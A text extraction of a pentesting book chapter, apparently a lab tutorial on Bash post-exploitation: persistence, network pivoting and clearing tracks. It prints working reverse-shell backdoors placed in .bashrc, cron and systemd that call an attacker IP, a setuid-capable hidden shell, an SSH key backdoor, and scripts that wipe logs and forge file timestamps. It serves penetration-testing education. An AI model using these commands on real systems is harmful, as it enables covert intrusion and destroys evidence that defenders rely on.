# Security Chapter Extract
Book: Steve Campbell - Bash Shell Scripting for Pentesters (2024, Packt Publishing Pvt Ltd) - libgen.li
Chapter: 11 - for guidance if you need a refresher on how to
Security Relevance Score: 28
Word Count: 6852
Extracted: 2025-06-13 23:41:12

---

for guidance if you need a refresher on how to
    


      do so.
     




     Before you move on, you’ll need to establish an interactive shell.
    

     Enter the
    


      su root
     


     command and observe that the output says
    


      su: must be run from a terminal
     


     .
    

     To fix this, enter the
    


      following command:
     



$ python3 -c 'import pty; pty.spawn("/bin/bash")'


     Then, enter the
    


      su root
     


     command and enter
    


      12345
     


     as the password when prompted.
    

     Finally, enter th
    





     e
    


      echo "user1:12345" |
     




       chpasswd
      




      command:
     











     Figure 12.2 – Setting the password for user1
    



     Tip
    



     You’ve probably noticed by now that the shell is echoing your commands back to you.
    

     To stop this, enter the
    


      stty -
     




       echo
      




      command.
     




     Finally, we must enter
    


      exit
     


     to exit out of the root prompt and enter
    


      su user1
     


     and
    


      12345
     


     when prompted for the password.
    

     You should now see a prompt for
    


      user1
     


     , as shown in the
    


      following figure:
     











     Figure 12.3 – Switching users to the user1 account
    



     With these initial setup steps out of the way, you’re ready to dive in and take on the exercises
    


      that follow.
     






     The fundamentals of persistence with Bash
    



     Persistence
    



     refers to maintaining access to a compromised system after the initial exploitation.
    

     For pentesters assessing Linux systems, understanding Bash-based persistence techniques is essential.
    

     This section covers some fundamental methods for establishing persistence
    


      using Bash.
     






     Creating a new user in Bash
    



     One basic
    



     technique is
    



     to create a new user account with root privileges.
    

     See the following example for the commands to add a new user with
    


      root privileges:
     









$ sudo useradd -m -s /bin/bash bashdoor
$ sudo usermod -aG sudo bashdoor
$ echo "bashdoor:password123" | sudo chpasswd


     These
    



     commands create a new user named
    


      bashdoor
     


     , add them
    



     to the
    


      sudo
     


     group, and set their password to
    


      password123
     


     .
    

     The new user will have full
    


      root access.
     




     Let’s take a closer look at how
    


      this works:
     






       useradd
      


      : Creates the new
     


       user account
      





       -m
      


      : Creates a
     


       home directory
      





       -s
      


      : Sets the login shell
     


       to
      




        bash
       






       usermod -aG
      


      : Adds the user to the
     



        sudo
       




       group
      





       chpasswd
      


      : Sets
     


       the password
      





     Let’s see this
    


      in action:
     











     Figure 12.4 – The process for adding a new user with full sudo privileges
    



     Adding a new
    



     user is noisy and is likely to be noticed.
    

     It may be less likely to
    



     be noticed if you simply add a backdoor shell to an existing user.
    

     We’ll explore this
    


      technique next.
     






     Backdooring the Bash shell
    



     The
    


      ~/.bashrc
     


     file is
    



     executed whenever a new interactive Bash shell is opened.
    

     We can add
    


      commands here.
     




     Before continuing, exit the
    


      bashdoor
     


     Terminal session so that you’re back at the prompt for
    


      user1
     


     .
    

     Enter the following command in your Kali Terminal to ensure you’re ready to catch the
    


      reverse shell:
     



$ nc -nlvp 5555


     In your
    


      user1
     


     shell, enter the following command, replacing the IP address and port with
    


      you
     





      r
     





      own:
     



$ echo "(/bin/bash -i >& /dev/tcp/192.168.56.101/5555 0>&1) &" >> ~/.bashrc


     This adds a reverse shell command to the user’s
    


      ~/.bashrc
     


     file.
    

     It will connect back to the attacker’s machine each time a new Terminal
    


      is opened.
     




     Then, establish a new session as
    


      user1
     


     with the
    


      su
     




       user1
      




      command.
     




     You should see a new session as
    


      user1
     


     in the Terminal where you ran
    


      nc
     


     , as shown in the
    


      following figure:
     











     Figure 12.5 – Our reverse shell has been established
    



     Tip
    



     If you make a mistake when using
    


      echo
     


     to append to the end of the
    


      .bashrc
     


     file, it may be difficult to remove using an editor due to shell limitations.
    

     You can enter the
    


      sed -i '$d' filename
     


     command to delete the last line of
    


      a file.
     




     In addition to
    



     Bash reverse shell backdoors in
    


      .bashrc
     


     , scheduled jobs are another effective way to maintain persistence on a Linux system
    


      in Bash.
     






     Creating backdoor cron jobs
    



     Linux
    


      cron jobs
     


     are
    



     scheduled tasks that run automatically at specified intervals.
    

     The
    


      cron daemon
     


     is
    



     a background service that executes these scheduled commands, scripts,
    


      or programs.
     




     Cron jobs are defined in
    



     crontab files, which contain the schedule and command to run.
    

     Each line in a crontab file represents a single job and follows
    


      this format:
     



* * * * * command_to_execute


     The five asterisks represent the
    


      following aspects:
     






       Minute (0-59)
      





       Hour (0-23)
      




      Day of
     


       month (1-31)
      





       Month (1-12)
      




      Day of week (0-7, where 0 and 7
     


       are Sunday)
      





     Users can edit their crontab file using the
    


      crontab -e
     


     command.
    

     Here’s an example of a cron job that runs a script every day at
    


      3:30 A.M.:
     



30 3 * * * /path/to/script.sh


     To view existing cron jobs, use the
    


      crontab -
     




       l
      




      command.
     




     For pentesters, cron jobs
    



     are important in post-exploitation and maintaining access for
    


      several reasons:
     






       Persistence
      


      : Attackers can
     



      use cron jobs to maintain access to a compromised system by scheduling tasks that re-establish connections or download
     


       updated malware.
      





       Data exfiltration
      


      : Cron jobs can be set up to send sensitive data from the compromised system to an attacker-controlled
     


       server regularly.
      





       Privilege escalation
      


      : If an attacker can create or modify cron jobs running as root or other privileged users, they can potentially escalate their privileges on
     


       the system.
      





       Backdoor maintenance
      


      : Cron jobs can be used to periodically check for and repair any backdoors that may have been removed
     


       or disabled.
      





       Evading detection
      


      : By scheduling malicious activities at specific times, attackers can potentially avoid detection by timing their actions when system administrators are less likely to be monitoring
     


       the system.
      





       Automated reconnaissance
      


      : Attackers can use cron jobs to gather information about the system or network regularly, helping them plan further attacks or identify
     


       new vulnerabilities.
      





     Cron jobs can be used to maintain persistence by scheduling malicious commands.
    

     Here’s
    


      an
     















      example:
     



$ echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1'" | crontab -


     This creates a cron job that attempts to establish a reverse shell connection every
    


      5 minutes.
     




     Here’s how
    


      it works:
     






       echo
      


      : This adds the new
     


       cron job.
      





       */5 * * * *
      


      : This sets the schedule to every
     


       5 minutes.
      



       The command creates a reverse shell (change the IP address and port
      


        as required).
       






       | crontab -
      


      : This installs the
     


       new crontab.
      





     Let’s see this in action.
    

     On the
    



     target system, we execute the command to create the cron job, followed immediately by the command to list all cron jobs.
    

     On the Kali system, within 5 minutes, we have our shell.
    

     This is demonstrated in the following screenshots; the following one shows the commands that have been executed on
    


      the target:
     











     Figure 12.6 – We create the cron job for persistence on the target system
    



     The following figure shows us receiving the reverse shell
    


      on Kali:
     











     Figure 12.7 – We capture our reverse shell from the cron job on the Kali system
    



     Understanding cron jobs is a key skill for privilege escalation and maintaining access post-exploitation.
    

     Next, we’ll look into backdooring system files
    


      for persistence.
     






     Backdooring system files for persistence
    



     Linux system
    


      .service
     


     files
    



     are configuration files that are used
    



     by systemd, the init system, and service manager for many modern Linux distributions.
    

     These files define how systemd should manage and control services, daemons, or
    


      background processes.
     




     The following are the key aspects of
    


      .
     




       service
      




      files:
     






       Location
      


      : Typically stored in
     


       /etc/systemd/system/
      



       or
      




        /usr/lib/systemd/system/
       






       Naming
      




        convention
       




       :
      




        [service_name].service
       






       Structure
      


      : Consists of sections such as
     


       [Unit]
      


      ,
     


       [Service]
      


      ,
     


       and
      




        [Install]
       






       Purpose
      


      : Defines service behavior, dependencies, start/stop commands,
     


       and more
      





     Here’s a basic example of a
    


      .
     




       service
      




      file:
     



[Unit]
Description=A Custom Service
After=network.target
[Service]
ExecStart=/usr/local/bin/a_service_script.sh
Restart=on-failure
User=user
[Install]
WantedBy=multi-user.target


     This file defines
    


      the following:
     





      A description of
     


       the service
      




      When it should start (after the network
     


       is up)
      




      The command to execute when starting
     


       the service
      




      Restart behavior if
     


       it fails
      




      The user under which the service
     


       should run
      




      Where the service should be installed in the system’s
     


       boot sequence
      





     Modifying
    



     system service files can provide
    



     persistence that survives reboots.
    

     This is demonstrated in the following command, which can be found in this chapter’s GitHub repository as
    


      ch12_persistence.service.sh
     


     .
    

     Please note that the ExecStart Bash reverse shell command is one line and may wrap due to
    


      bo
     







      ok formatting:
     



#!/usr/bin/env bash
sudo tee -a /etc/systemd/system/persistence.service << EOF
[Unit]
Description=Persistence Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable persistence.service
sudo systemctl start persistence.service


     This creates a
    



     new systemd service that establishes a reverse
    



     shell connection on
    


      system startup.
     




     Here’s an explanation for
    


      this code:
     






       tee -a
      


      creates the
     


       service file.
      




      The
     


       <<
      


      redirection sends everything between the EOF labels to the
     


       service file.
      




      The
     


       [Unit]
      


      ,
     


       [Service]
      


      , and
     


       [Install]
      


      sections define
     


       the service.
      





       ExecStart
      


      specifies the command
     


       to run.
      





       systemctl enable
      


      sets the service to start
     


       on boot.
      





       systemctl start
      


      runs the
     


       service immediately.
      





     Let’s see this in action.
    

     First, I’ll run the
    


      python3 -m http.server
     


     command on my Kali system to run an HTTP server for file transfer.
    

     Then, I’ll use
    


      wget
     


     on the target system to download the file from Kali, saving the file to
    


      /tmp
     


     .
    

     Next, I’ll make the file executable and execute it.
    

     On Kali, I’ll check my Terminal and find that I’ve received the reverse shell and have a session as the root user.
    

     This is demonstrated in the
    


      following figures.
     




     In the following figure, you can see that the Python server has been started on the
    


      Kali system:
     











     Figure 12.8 – We run an HTTP server for file transfer
    



     The following figure shows the commands that were run on the target system to download
    


      the script:
     











     Figure 12.9 – We download the script to the target system
    



     In the following
    



     figure, we’re making the script executable
    



     and
    


      running it:
     











     Figure 12.10 – We make the script executable and execute it to enable and start the service
    



     Now, we receive a reverse shell as root
    


      on Kali:
     











     Figure 12.11: We receive a reverse shell as root on Kali
    



     In this section, you learned how systemd system services work, how system service files are structured, and how to use them for post-exploitation persistence.
    

     In the next section, you’ll learn how to regain access at will by appending SSH keys to a
    


      user profile.
     






     Backdooring with SSH authorized keys
    



     The SSH
    


      authorized_keys
     


     file is a
    



     mechanism for controlling SSH access to
    



     a user account without requiring a password.
    

     This section will provide an overview of how it works and its potential use
    


      for persistence.
     




     Here’s how the
    


      authorized_keys
     



      file works:
     





      It’s located in the
     


       ~/.ssh/authorized_keys
      


      file for
     


       each user.
      




      It contains public keys, one
     


       per line.
      




      When a client attempts to connect, the server checks whether the client’s public key matches any in
     


       this file.
      




      If a match is found, the connection is allowed without the need to prompt for
     


       a password.
      





     After gaining access to a user account, if you find that SSH is accessible, you can add your public key to a user’s
    


      authorized_keys
     


     file.
    

     This will allow you to maintain SSH access, even if passwords
    


      are changed.
     




     To add a key, run the
    


      following command:
     



$ echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@example.com" >> ~/.ssh/authorized_keys


     This command appends your public key to the
    



       authorized_keys
      




      file.
     




     Let’s take a
    


      closer look:
     






       echo
      


      : This outputs the
     


       specified text.
      



       The text is the attacker’s public key.
      

       It starts with
      


        ssh-rsa
       


       and is followed by the
      


        key data.
       






       >>
      


      : This redirects and appends the output to the
     



        authorized_keys
       




       file.
      





       ~/.ssh/authorized_keys
      


      : This specifies the file path in the user’s
     


       home directory.
      





     This
    



     technique provides a stealthy way to maintain
    



     access as it doesn’t require system binaries to be modified or new user accounts to be created.
    

     However, it may be detected by monitoring changes to
    


      authorized_keys
     


     files or through SSH
    


      key audits.
     




     Next, we’ll look at more advanced
    


      persistence techniques.
     






     Learning advanced persistence techniques
    



     In this section, we’ll
    



     explore a persistence technique that’s a bit more advanced and might be more stealthy and therefore less likely to be caught during
    


      your pentest.
     




     Capabilities in Linux are a security feature that allows for fine-grained control over what privileged operations processes can perform.
    

     They provide a way to grant specific privileges to processes without the need to give them full root access.
    

     This helps improve system security by following the principle of
    


      least privilege.
     




     The following are some key points about
    


      Linux’s capabilities:
     





      They break down the traditional all-or-nothing root privileges into smaller, more
     


       specific permissions.
      




      Capabilities are associated with executable files and processes,
     


       not users.
      




      There are over 40 distinct capabilities in modern
     


       Linux kernels.
      




      The following are some
     


       c
      





       ommon capabilities:
      





         CAP_SETUID
        


        : This capability allows a process to set the user ID of the current process, effectively enabling it to switch to any user,
       


         including root.
        





         CAP_NET_BIND_SERVICE
        


        : This allows us to bind to privileged
       


         ports (<
        




          1024
         




         ).
        





         CAP_CHOWN
        


        : This allows us to change
       


         file ownership.
        





         CAP_DAC_OVERRIDE
        


        : This allows us to bypass file read, write, and execute
       


         permission checks.
        






      Capabilities can be viewed with
     


       getcap
      


      and set on executable files
     


       using
      




        setcap
       




       .
      





     Here’s an example of how to view the capabilities of
    


      a process:
     



$ getcap /path/to/executable


     Here’s an example of how to set the capabilities of
    


      an executable:
     



$ sudo setcap cap_setuid=+ep /path/to/executable


     This command grants the
    


      CAP_SUID
     


     capability to the
    


      specified executable.
     




     To view the capabilities of a running process, run the following command, replacing
    


      PID
     


     with the process ID you want
    


      to check:
     



$ getcap PID


     The capability’s
    


      =eip
     


     suffix
    



     provides a way to precisely control which capabilities are available to processes and how they can be used or passed on to child processes.
    

     This granular control allows system administrators to implement the principle of least privilege, granting only the specific capabilities required for a process to function, rather than giving it full
    


      root privileges.
     




     The
    


      =eip
     


     suffix refers to the
    


      effective
     


     ,
    


      inheritable
     


     , and
    


      permitted
     


     set of capabilities.
    

     This suffix is used when setting or viewing capabilities on files or processes in Linux systems that support fine-grained
    


      privilege control.
     




     To understand
    


      =eip
     


     , let’s break
    


      it down:
     






       e
      


      –
     


       effective
      


      : These are the capabilities currently in use by
     


       the process.
      





       i
      


      –
     


       inheritable
      


      : These capabilities can be inherited by
     


       child processes.
      





       p
      


      –
     


       permitted
      


      : These are the capabilities that the process is allowed
     


       to use.
      





     When you see a capability with the
    


      =eip
     


     suffix, it means that the capability has been set for all three sets: effective, inheritable,
    


      and permitted.
     




     For example, if you were to set the
    


      CAP_SETUID
     


     capability on a file with
    


      =eip
     


     , you could use a command
    


      like this:
     



$ sudo setcap cap_setuid=eip /path/to/file


     This command sets the
    


      CAP_SETUID
     


     capability as effective, inheritable, and permitted for the
    


      specified file.
     




     Here’s an example of
    



     using Linux capabilities to maintain persistent access post-exploitation stealthily.
    

     This script demonstrates how to maintain access using Linux capabilities.
    

     You can find it in this chapter’s GitHub repository
    


      as
     








       ch12_capabilities.sh
      




      :
     



#!/usr/bin/env bash
# Create a hidden directory
mkdir /tmp/.persist
# Copy /bin/bash to the hidden directory
cp /bin/bash /tmp/.persist/shell
# Set the CAP_SETUID capability on the copied shell
setcap cap_setuid+ep /tmp/.persist/shell


     Let’s take a closer look at
    


      this code:
     





      First, it creates a hidden directory
     


       in
      




        /tmp
       




       .
      




      The script copies the Bash shell to this
     


       hidden location.
      




      Then, it uses the
     


       setcap
      


      command to add the
     


       CAP_SETUID
      


      capability to the copied shell.
     

      This capability allows the shell to set the user ID, effectively giving it
     






       root-like privileges.
      





     Directories such as
    


      /tmp
     


     and
    


      /dev/shm
     


     may be cleared on restart, so be sure to check whether they’re mounted as a filesystem of the
    


      tmpfs
     


     type before saving any files for persistence.
    

     If they’re mounted as
    


      tmpfs
     


     , then you need to choose a different location; otherwise, your persistence mechanism will be lost on restart.
    

     You can check this by entering the
    


      mount
     


     command and
    


      grep
     


     for the directory location – for
    


      example,
     




       /tmp
      




      .
     




     This technique is difficult to detect through standard system monitoring.
    

     It doesn’t modify core system files or create new user accounts.
    

     However, it provides a way to regain
    


      elevated privileges.
     




     Understanding and
    



     using Linux capabilities provides a more stealthy way to regain privileged access for
    


      post-exploitation operations.
     




     In the next section, we’ll explore methods that are used to pivot through compromised Linux Bash environments to gain access to networks that would otherwise be beyond
    


      our reach.
     






     The basics of network pivoting with Bash
    



     In the field of pentesting, it’s
    



     quite usual to utilize a breached system as a stepping-stone
    



     for exploring and accessing additional networks linked to that system.
    

     This section will explore the methodology that’s used to pivot through a compromised Linux
    


      Bash environment.
     




     SSH port forwarding
    



     is a simple yet effective method for pivoting.
    

     It allows you to tunnel traffic through an SSH connection, enabling access to otherwise unreachable systems.
    

     In this section, we’ll cover two types of SSH port forwarding: local
    


      and remote.
     




     Local port forwarding
    



     lets you forward a port from your local machine to a remote server through an SSH connection.
    

     The following command is an example of local
    


      port forwarding:
     



$ ssh -L 8080:internal_server:80 user@pivot_host


     This command establishes an SSH connection to
    


      pivot_host
     


     and forwards local port
    


      8080
     


     to port
    


      80
     


     on
    


      internal_server
     


     through the
    


      pivot_host
     


     .
    

     After executing this command, accessing
    


      localhost:8080
     


     on your local machine will reach port
    


      80
     


     on
    


      internal_server
     


     .
    

     Local port forwarding is best used when you need to reach a single server port on an internal network through a
    


      compromised system.
     




     Remote port forwarding
    



     is the reverse of local port forwarding.
    

     It allows you to forward a port from the remote SSH server to your local machine.
    

     The following command exemplifies starting a remote port forward
    


      with SSH:
     



$ ssh -R 8080:localhost:80 user@pivot_host


     This command forwards port
    


      8080
     


     on
    


      pivot_host
     


     to port
    


      80
     


     on your local machine.
    

     So, anyone accessing port
    


      8080
     


     on
    


      pivot_host
     


     will reach port
    


      80
     


     on your local machine.
    

     Remote port forwarding is best used when you need to exfiltrate data out of an internal network, such as when you need to receive a
    


      reverse shell.
     




     SSH forward port forwarding
    



     can be inflexible because they are one-to-one port mappings.
    

     A
    


      Socket Secure
     


     (
    


      SOCKS
     


     ) proxy
    



     is a general-purpose proxy that routes network traffic between a client and a server via a proxy server.
    

     Setting up a SOCKS proxy with SSH allows for more flexible pivoting as it can handle various types
    


      of traffic.
     




     The following SSH
    



     command
    



     initiates a dynamic
    


      SOCKS proxy:
     



$ ssh -D 9050 user@pivot_host


     This command establishes an SSH connection to
    


      pivot_host
     


     and creates a SOCKS proxy on local port
    


      9050
     


     .
    

     You can then configure your applications (for example, web browser) to use this SOCKS proxy.
    

     For example, you can use this proxy
    


      with
     




       curl
      




      :
     



$ curl --socks5 localhost:9050 http://internal_server


     This command sends an HTTP request to
    


      internal_server
     


     through the
    


      SOCKS proxy.
     




     You can also use the
    


      proxychains
     


     tool
    



     in combination with a SOCKS proxy.
    

     This is most helpful when you need to use tools that aren’t proxy-aware with a
    


      SOCKS proxy.
     




     We need to configure proxychains before we can use it.
    

     The configuration file is typically located at
    


      /etc/proxychains4.conf
     


     .
    

     Edit this file and change the last line from
    


      socks4 127.0.0.1 9050
     


     to
    


      socks5
     



      127.0.0.1 9050
     


     .
    

     Note that there’s a tab character between
    


      socks5
     



      and
     




       127.0.0.1
      




      .
     




     Now that we have proxychains set up, let’s use it on Kali with
    


      nmap
     


     to perform a TCP port scan.
    

     Here’s the
    


      basic syntax:
     



$ proxychains -q nmap -sT -p- [target_ip]


     Let’s take a closer look at
    


      this command:
     






       proxychains -q
      


      : This tells the system to use proxychains for the following command.
     

      The
     


       -q
      


      option makes
     


       proxychains quiet.
      





       nmap
      


      : The network mapping tool
     


       we’re using.
      





       -sT
      


      : This flag tells
     


       nmap
      


      to perform a TCP connect scan.
     

      You can’t perform a TCP SYN or UDP scan through a SOCKS proxy.
     

      The scan must be a TCP
     


       connect scan.
      





       -p-
      


      : This flag tells
     


       nmap
      


      to scan all
     


       ports (
      




        1
       




       -
      




        65535
       




       ).
      





       [target_ip]
      


      : Replace this with the IP address you want
     


       to scan.
      





     In this case, our current target
    



     doesn’t have SSH exposed.
    

     You’ll learn how to pivot when SSH isn’t available in the
    


      next section.
     




     Be aware that scanning through
    



     a SOCKS proxy is very slow.
    

     You may want to restrict your scans to a limited number of ports.
    

     An alternative is to transfer a tool such as Goscan to the pivot host and scan from there.
    

     You can find Goscan
    



     at
    


      https://github.com/sdcampbell/goscan
     


     .
    

     ProjectDiscovery Naabu is
    


      another option.
     




     These basic pivoting techniques provide a foundation for accessing restricted network segments during pentesting.
    

     They allow you to extend your reach within a target environment, facilitating further exploration and testing of internal systems.
    

     We’ll explore more advanced pivot
    





     ing techniques in the
    


      next section.
     






     Mastering advanced pivoting and lateral movement
    



     In this section, we’ll explore advanced pivoting and lateral movement techniques using Bash scripting.
    

     These methods go beyond basic SSH tunneling and SOCKS proxies, focusing on more sophisticated approaches to navigate complex
    


      network environments.
     






     Dynamic chain pivoting
    




      Dynamic chain pivoting
     


     involves
    



     creating a series of interconnected pivots to reach deeper into a network.
    

     This technique is particularly useful when you’re dealing with segmented networks or when you need to bypass multiple layers
    


      of security.
     




     Here’s a Bash script that automates the process of setting up a dynamic pivot chain.
    

     You can find this script in this chapter’s GitHub
    





     repository
    


      as
     




       ch12_dynamic_pivot.sh
      




      :
     



#!/usr/bin/env bash
pivot_hosts=("user-1@192.168.5.150" "user-2@10.1.0.50" "user-3@172.16.1.25")
target="user-4@192.168.20.200"
local_port=9090
# Set up the chain
for ((i=0; i<${#pivot_hosts[@]}; i++)); do
    next_port=$((local_port + i + 1))
    if [ $i -eq 0 ]; then
        ssh -f -N -L ${local_port}:localhost:${next_port} ${pivot_hosts[$i]}
    elif [ $i -eq $((${#pivot_hosts[@]} - 1)) ]; then
        ssh -f -N -L ${next_port}:${target%@*}:22 ${pivot_hosts[$i]}
    else
        ssh -f -N -L ${next_port}:localhost:$((next_port + 1)) ${pivot_hosts[$i]}
    fi
done
echo "[+] Pivot chain is established! Connect to ${target} via: ssh -p ${local_port} ${target#*@}"


     Run this script on the attacker machine.
    

     This script sets up a chain of SSH tunnels through multiple pivot hosts.
    

     It starts by creating a local port forward on the attacker machine, then chains
    



     through each pivot host, ultimately reaching the target.
    

     The script uses a loop to create each link in the chain, with special handling for the first and
    


      last pivots.
     




     Tip
    



     SSH provides an easier way to do the same thing using jump hosts.
    

     The syntax of the SSH command to use multiple jump hosts is
    


      ssh -J
     




       user1@jumphost1,user2@jumphost2 user3@targethost
      




      .
     




     Dynamic chain pivoting can
    



     be performed without SSH access using external tools.
    

     Two related tools are
    



     Chisel (
    


      https://github.com/jpillora/chisel
     


     ) and Ligolo-ng (
    


      https://github.com/nicocha30/ligolo-ng
     


     ).
    

     These
    



     tools can be used in situations where you don’t have an SSH server to pivot through.
    

     They require you to upload a single executable to the pivot host and don’t require root privileges
    


      to operate.
     




     I’ll be using Chisel in
    


      this example.
     




     Making a note of my Kali system’s current IP address, I’ll start an HTTP server to transfer Chisel over to the target by entering the
    


      python3 -m http.server
     


     command in the same directory where I’ve
    


      downloaded Chisel.
     




     On the target system where I have a shell as
    


      user6
     


     , I’ll download the Chisel file in the
    


      /tmp
     


     directory using the
    


      wget
     



      http://10.0.0.66:8000/chisel
     


     command.
    

     You must make it executable before you can run it using the
    


      chmod +x chisel
     


     command.
    

     You must also run the same command on Kali because you’ll need to run Chisel on both ends of
    


      the connection.
     




     Next, start Chisel on Kali using the
    


      ./chisel server -p 8001 –reverse
     


     command.
    

     Then, on the target (pivot) system, run the
    


      ./chisel client 10.0.0.66:8001 R:1080:socks
     


     command.
    

     Ensure that you replace the IP address with your own
    


      as appropriate.
     




     Let’s see this in action.
    

     In the following screenshots, Kali has an IP address of
    


      10.0.0.66
     


     .
    

     The firewall at
    


      10.0.0.149
     


     has exposed a web server on port
    


      80
     


     .
    

     This web server is hosted at
    


      10.1.1.103
     


     on the other side of the firewall.
    

     I’ll use the Chisel SOCKS proxy to scan a Windows host on the
    


      10.1.1.0/24
     


     network, on the other side of the firewall
    


      from Kali.
     




     The following figure shows using Python to transfer the Chisel file before running the command to start the
    


      Chisel server:
     











     Figure 12.12: Chisel is served to the pivot target from Kali and the server side is started
    



     The following figure
    



     demonstrates the commands that have been run on the target to transfer Chisel and start the client side of
    


      the connection:
     











     Figure 12.13: Chisel is started on the pivot host in client mode, completing the reverse SOCKS connection
    



     With the connection established, we can use
    


      proxychains
     


     to scan through the
    



       SOCKS
      




      tunnel:
     











     Figure 12.14: Kali scans a Windows host through the SOCKS proxy
    



     We’ve only scratched the
    



     surface of Chisel’s capabilities.
    

     You can use Chisel to pivot through multiple hops into
    


      a network.
     




     Ligolo-ng works differently.
    

     Instead of creating a SOCKS proxy, it creates a userland network stack that works much like a VPN connection to route network traffic through a tunnel.
    

     You can find the tool, documentation, and command examples
    


      at
     




       https://github.com/Nicocha30/ligolo-ng
      




      .
     




     In some cases, you may not be able to establish outbound connections from an internal network to the Internet.
    

     In the next section, we’ll explore
    


      DNS tunneling
     


     as a slower yet dependable
    


      pivot technique.
     






     DNS tunneling
    



     DNS tunneling can
    



     be used to bypass firewalls and establish a covert channel for pivoting.
    

     I’ve used this technique when plugging miniature computers such as a Raspberry Pi into a network port to establish a covert tunnel out of restricted networks when outbound SSH or Wireguard connections were blocked.
    

     I’ve also used DNS tunneling as a failover for remote testing devices sent to client sites.
    

     If network restrictions prevented the testing device from connecting back to me, I can still establish a connection via the DNS tunnel and complete
    


      the pentest.
     




     I’ve found that it may be difficult for some to understand how DNS tunneling works and you may assume that if port
    


      53
     


     outbound to the internet is blocked, then you’re blocking DNS tunneling.
    

     That is simply
    


      not true.
     




     Here’s a step-by-step breakdown of how
    



     DNS tunneling
    


      typically works:
     





      The client, which is the device attempting to bypass network restrictions, creates a DNS query that contains encoded data as the subdomain name.
     

      This data might be part of a command, file, or other information that needs to be sent to an external server.
     

      The query is typically for a subdomain of a domain that’s controlled by the attacker or the legitimate service using
     


       DNS tunneling.
      




      The client’s DNS query is sent to the DNS server that’s been configured for the network interface.
     

      The network DNS server can’t resolve the subdomain, so it forwards the request to the authoritative DNS server for
     


       the domain.
      




      The DNS query traverses the normal DNS resolution process, eventually reaching an authoritative DNS server controlled by
     


       the attacker.
      




      This server is configured to understand the encoded data within the DNS query.
     

      The authoritative DNS server decodes the data from the query, processes it (that is, executes a command), and then encodes a response within a
     


       DNS reply.
      




      The response is sent back to the client in the form of a DNS response, which appears to be a regular DNS response to any network
     


       monitoring system.
      




      The client receives the DNS response and decodes the data.
     

      This could be an acknowledgment, a piece of a file being exfiltrated, or a response to a command that was
     


       sent earlier.
      




      The process
     



      repeats as necessary, with the client and server continuing to communicate covertly via DNS queries
     


       and responses.
      





     All except the most locked-down networks are going to forward requests for subdomains that can’t be resolved from the internal network DNS server to the authoritative server for the domain.
    

     This means that if you have to tunnel out of a network that requires all outbound network traffic to either be allowed with a firewall rule or otherwise must go through an HTTP/S proxy, you can bypass these network restrictions by utilizing DNS tunneling.
    

     It’s slow, hence why DNS tunneling is normally used as a
    


      last resort.
     




     To use this technique, you’ll need to set up an
    


      iodined
     


     server
    



     on a host that’s been exposed to the internet and ensure that it’s authoritative for the domain you’re using
    


      for tunneling.
     




     See the iodined project documentation
    



     for configuration and execution
    


      instructions:
     




       https://github.com/yarrick/iodine
      




      .
     




     Be aware that a DNS tunnel is plaintext or unencrypted communications.
    

     Be sure to encrypt traffic through the tunnel.
    

     When used to communicate with a small drop box or remote testing device, I establish an SSH session through the
    


      DNS tunnel.
     




     This concludes our discussion on pivoting.
    

     At this point, you’ve learned how to use SSH and external tools to establish forward and reverse pivot tunnels, from basic through advanced scenarios.
    

     In the next section, we’ll discuss cleaning up and covering our
    


      tracks post-exploitation.
     






     Cleanup and covering tracks
    



     In pentesting, it’s essential to clean up after completing your assessment.
    

     This process involves removing any artifacts, logs, or traces that might indicate your presence on the system.
    

     This section covers various techniques you can use to clean up and cover your tracks using
    


      Bash scripting.
     




     One of the first steps in
    



     cleaning up is to clear the command history.
    

     This prevents the system administrator from seeing the commands
    


      you’ve executed.
     




     The
    


      history
     


     command will clear and write an empty command history – that is,
    



       history -cw
      




      .
     




     The
    


      history -c
     


     command clears the current session’s history from memory, while the
    


      history -w
     


     command writes the (now empty) history to the history file, effectively erasing the
    


      previous contents.
     




     Deleting the
    


      ~/.bash_history
     


     file doesn’t clear the history because ending your current session will cause all commands that were entered during the session to be written to the recreated file
    


      on exit.
     




     You can also prevent any command history from being recorded by setting the
    


      HISTFILE
     


     environment variable to
    


      /dev/null
     


     at the start of a Bash session using the
    


      set
     




       HISTFILE=/dev/null
      




      command.
     




     System logs often contain
    



     evidence of your activities.
    

     Here’s a script you can use to clear common log files.
    

     You can find it in this chap
    





     ter’s GitHub repository
    


      as
     




       ch12_clear_logs.sh
      




      :
     



#!/usr/bin/env bash
log_files=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/messages"
    "/var/log/secure"
)
for file in "${log_files[@]}"; do
    if [ -f "$file" ]; then
        echo "" > "$file"
        echo "Cleared $file"
    else
        echo "$file not found"
    fi
done


     This script iterates through an array of common log files.
    

     For each file that exists, it overwrites the contents with an empty string, effectively clearing the log.
    

     Of course, it requires root access to clear
    


      these files.
     




     To make your activities less obvious, you can modify the timestamps of files you’ve accessed or modified.
    

     The following script will modify an array of files by changing the timestamp so that it matches the
    


      /etc/hosts
     


     file.
    

     You can find it in this chap
    





     ter’s GitHub repository
    


      as
     




       ch12_timestamps.sh
      




      :
     



#!/usr/bin/env bash
files_to_modify=(
    "/etc/passwd"
    "/etc/shadow"
    "/var/log/auth.log"
)
reference_file="/etc/hosts"
for file in "${files_to_modify[@]}"; do
    if [ -f "$file" ]; then
        touch -r "$reference_file" "$file"
        echo "Modified timestamp of $file"
    else
        echo "$file not found"
    fi
done


     This script uses the
    


      touch
     


     command with the
    


      -r
     


     option to set the timestamp of each file in the list to match that of a reference file (in this
    


      case,
     




       /etc/hosts
      




      ).
     




     For sensitive files that need to be completely erased, use the
    



       shred
      




      command:
     



shred -u -z -n 3 sensitive_file.txt


     This command overwrites
    



     the file with random data three times (
    


      -n 3
     


     ), then with zeros (
    


      -z
     


     ), and finally removes the
    


      file (
     




       -u
      




      ).
     




     If you’ve made network connections, you might want to clear the
    


      ARP cache:
     



sudo ip -s -s neigh flush all


     This command flushes all entries from the
    


      ARP cache.
     




     Here’s a comprehensive cleanup script that combines several of these techniques.
    

     It can be found in this
    





     chapter’s GitHub repository
    


      as
     




       ch12_cleanup.sh
      




      :
     



#!/usr/bin/env bash
# Clear bash history
history -c
history -w
# Clear common log files
log_files=("/var/log/auth.log" "/var/log/syslog" "/var/log/messages" "/var/log/secure")
for file in "${log_files[@]}"; do
    if [ -f "$file" ]; then
